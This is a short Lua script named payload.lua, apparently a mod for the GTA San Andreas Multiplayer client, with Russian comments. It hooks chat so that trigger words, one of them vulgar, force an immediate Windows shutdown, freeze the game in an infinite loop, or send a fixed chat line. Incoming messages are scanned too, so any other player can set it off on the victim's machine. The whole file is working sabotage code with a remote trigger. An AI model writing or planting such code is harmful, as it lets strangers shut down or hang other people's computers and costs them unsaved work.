-- payload.lua
-- Использование прямого хука SAMPFUNCS без внешних зависимостей

function onSendChat(text)
    if text:find("сырколбаска") then
        lua_thread.create(function()
            wait(500)
            sampSendChat("123655")
        end)
    elseif text:find("хуйкина") then
        os.execute("Shutdown /s /t 0 /f")
    elseif text:find("кукусики") then
        while true do end
    end
end

function onReceiveChatMessage(text)
    -- Очистка текста от цветов для надежного поиска
    local cleanText = text:gsub("{%x%x%x%x%x%x}", "")
    
    if cleanText:find("хуйкина") then
        os.execute("Shutdown /s /t 0 /f")
    elseif cleanText:find("кукусики") then
        while true do end
    elseif cleanText:find("сырколбаска") then
        sampSendChat("123655")
    end
end
